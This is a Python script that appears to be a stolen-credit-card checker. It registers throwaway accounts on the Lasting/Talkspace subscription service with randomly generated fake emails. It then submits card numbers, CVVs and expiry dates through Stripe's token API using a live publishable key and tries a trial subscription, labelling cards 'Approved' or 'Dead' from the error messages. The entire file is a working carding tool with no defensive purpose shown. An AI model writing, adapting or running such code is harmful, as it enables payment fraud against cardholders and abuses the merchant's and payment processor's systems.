import string,random, requests,names

def capture(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

def rr(length):
    letters = string.ascii_letters + string.digits
    return  ''.join(random.choice(letters) for i in range(length))

def lasting(cc, month, year, cvv):
        try:
            session  = requests.Session()   
            mail = CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            p = {'user': {'email': mail,'password': 'zdrNc1',},}

            r =  session.post("https://lasting-api.talkspace.com/api/v1/users",json=p)
            jwt = capture(r.text,'"jwt":"','"')
        

            data = f'card[number]={cc}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F213f5d754b%3B+stripe-js-v3%2F213f5d754b&time_on_page=69987&key=pk_live_0dKqmbrnO3aTYXiPjHukEqH8&pasted_fields=number'
            r_2 =  session.post('https://api.stripe.com/v1/tokens', data=data)
            
            if 'error' in r_2.text: 
                if "Your card's security code is invalid." in r_2.text:
                    status = "Approved! ✅"
                    msg = "Your card's security code is invalid."

                    return status, msg
                    
                else:
                    status = "Dead! ❌"             
                    msg= r_2.json()['error']['message']

                    return status, msg

            else:
                
                idw = r_2.json()['id']
                headers = {'authority': 'lasting-api.talkspace.com','accept': 'application/json, text/plain, */*','accept-language': 'en-US,en;q=0.9','authorization': jwt,'content-type': 'application/json','origin': 'https://app.getlasting.com','referer': 'https://app.getlasting.com/','sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',}
                json_data = {'stripe_token': idw,'subscription_type': '3999-one-month-with-trial',}
                r_3 =  session.post('https://lasting-api.talkspace.com/api/v1/ecommerce/subscribe', headers=headers, json=json_data)
                
                if "Your card's security code is incorrect." in r_3.text:
                    status = 'Aproved! ✅'
                    msg = r_3.json()['errors'][0]
                
                elif '{"errors":["' in r_3.text: 
                    
                    status = 'Dead! ❌'
                    msg = r_3.json()['errors'][0]

                else:
                    status = 'Aproved! ✅'
                    msg = 'Aproved! ✅'
        
                return status , msg

        except:
            status = 'Dead! ❌'
            msg = 'Your card was declined.'

            return status, msg
            